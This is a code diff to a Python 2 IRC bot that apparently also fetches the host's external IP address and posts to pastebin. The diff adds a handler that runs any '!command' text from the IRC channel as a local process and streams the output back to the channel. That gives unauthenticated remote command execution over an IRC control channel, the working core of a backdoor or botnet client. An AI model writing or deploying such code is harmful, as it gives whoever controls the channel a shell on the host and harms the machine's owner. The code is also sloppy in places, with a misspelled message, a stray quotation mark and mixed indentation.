@@ -26,6 +26,7 @@ import locale # System language
 import urllib2 # Used to get external ip address
 import argparse # CLI arg parsing
 import subprocess # Spawn subprocesses
+import time # IMport time for sleep
 from pastebin import PastebinAPI # Paste to pastebin
 
 # CLI options
@@ -198,6 +199,32 @@ def connect(): # Connects to the server, finds commands, etc.
   ircsock.send('NICK '+ botnick +'\n') # Assign NICK to the bot
   joinchan(channel) # Join the channel
 
+def command(com):
+  if (str(platform.platform())) [0:3]=="Win":
+    sendmsg(channel, '"womdows is not supported at this time, this might not work.')
+    try:
+      p = subprocess.Popen(com.split(" "), shell=False, stdout=subprocess.PIPE)
+      p.wait()
+      output = p.stdout.read()
+      for line in output.split('\n'):
+        if ( line != ''):
+	  time.sleep(0.5)
+	  sendmsg(channel, line)
+    except OSError:
+      sendmsg(channel, 'This is not an valid command.')
+     
+  else:
+    try:
+      p = subprocess.Popen(com.split(" "), shell=False, stdout=subprocess.PIPE)
+      p.wait()
+      output = p.stdout.read()
+      for line in output.split('\n'):
+        if ( line != ''):
+	  time.sleep(0.5)
+	  sendmsg(channel, line)
+    except OSError:
+      sendmsg(channel, 'This is not an valid command.')
+ 
 def main():
   os.system('clear') # Clear the screen
   banner() # Print the banner
@@ -240,4 +267,7 @@ def main():
 
     if ircmsg.find(':!help') != -1: # Calls ls() if 'pwd BotName' is found
       help()
+    
+    if ircmsg.find(':!command') != -1: # Calls command() if ':command' is found
+      command(ircmsg.split("!command ")[len(ircmsg.split("!command "))-1])
 main()
